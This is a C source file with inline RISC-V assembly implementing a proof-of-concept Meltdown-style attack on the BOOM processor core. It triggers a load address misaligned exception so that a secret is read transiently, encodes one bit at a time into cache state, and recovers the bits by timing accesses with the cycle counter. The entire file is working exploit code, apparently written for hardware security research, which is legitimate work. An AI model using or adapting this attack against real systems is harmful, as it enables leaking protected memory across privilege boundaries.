/* Load address misaligned meltdown attack on risc-v BOOM
 *
 * Load address misaligned exception is a type of exception that can trigger meltdown in Boom CPU.
 * Based on the misaligned address, it can leak different parts of the secret value.
 */

#include "encoding.h"
#include "util.h"
#include <stdint.h>
#include <stdio.h>

extern uint8_t data0[];
extern uint8_t data1[];
extern uint8_t secret[];

#define S_WORD 32

void transient(uint64_t idx) {
  // Flush all PTEs (for deterministic)
  asm volatile("sfence.vma zero, zero");

  // Flush all cache line conflicting with target line
  asm volatile("la a1, conflict0 + 512\n"
               "ld a2, 0(a1)\n"
               "la a1, conflict1 + 512\n"
               "ld a2, 0(a1)\n"
               "la a1, conflict2 + 512\n"
               "ld a2, 0(a1)\n"
               "la a1, conflict3 + 512\n"
               "ld a2, 0(a1)\n"
               "la a1, conflict4 + 512\n"
               "ld a2, 0(a1)\n"
               "la a1, conflict5 + 512\n"
               "ld a2, 0(a1)\n"
               "la a1, conflict6 + 512\n"
               "ld a2, 0(a1)\n"
               "la a1, conflict7 + 512\n"
               "ld a2, 0(a1)\n");

  asm volatile("fence\n");

  // Fetch PTE and cache line only for the secret address
  asm volatile("la gp, 1f\n"
               "la a5, data0\n"
               "la a4, secret\n"
               "li a2, 1352\n"
               "li a3, 7\n"
               "fcvt.s.lu fa4, a3\n"
               "fcvt.s.lu fa5, a2\n"
               "fdiv.s    fa5, fa5, fa4\n"
               "fdiv.s    fa5, fa5, fa4\n"
               "fdiv.s    fa5, fa5, fa4\n"
               "fdiv.s    fa5, fa5, fa4\n"
               "fcvt.lu.s a2, fa5\n"
               "add a2, a2, a5\n"
               "ld a3, 1(a4)\n"
               "srl a3, a3, a0\n"
               "andi a3, a3, 1\n"
               "slli a3, a3, 9\n"
               "add a5, a5, a3\n"
               "ld a5, 0(a5)\n"
               "1: li gp, 0\n");

  return;
}

int main(void) {
  uint64_t sec = 0xdeadbee0;
  uint8_t bits[S_WORD] = {
      0,
  };
  uint8_t votes[S_WORD] = {
      0,
  };

  uint64_t start, end, dummy;

  printf("[*] Misaligned meltdown attack on BOOM\n");

  for (int idx = 32 - 1; idx >= 0; idx--) {
    printf("[%2d] Want(%d) Cycles: ", idx, (int)((sec >> idx) & 1));
    uint64_t cycles[TRIAL] = {
        0,
    };
    for (int t = 0; t < TRIAL; t++) {

      transient(idx);

      asm volatile("csrr %0, cycle\n" : "=r"(start));
      dummy = data0[512];
      asm volatile("csrr %0, cycle\n" : "=r"(end));

      cycles[t] = end - start;
      printf("%ld ", cycles[t]);
    }

    int sum = 0;
    for (int t = 0; t < TRIAL; t++) {
      if (cycles[t] < 50)
        sum++;
    }


    bits[idx] = (sum > TRIAL / 2) ? 1 : 0;
    votes[idx] = (sum > TRIAL / 2) ? sum : TRIAL - sum;

    printf(" --> %d (%d/%d)\n", bits[idx], votes[idx], TRIAL);
  }

  printf("[*] Secret: 0x");
  for (int idx = S_WORD - 4; idx >= 0; idx -= 4) {
    uint16_t hex = bits[idx + 3] << 3 | bits[idx + 2] << 2 |
                   bits[idx + 1] << 1 | bits[idx];
    printf("%x", hex);
  }
  printf("\n");

  return 0;
}
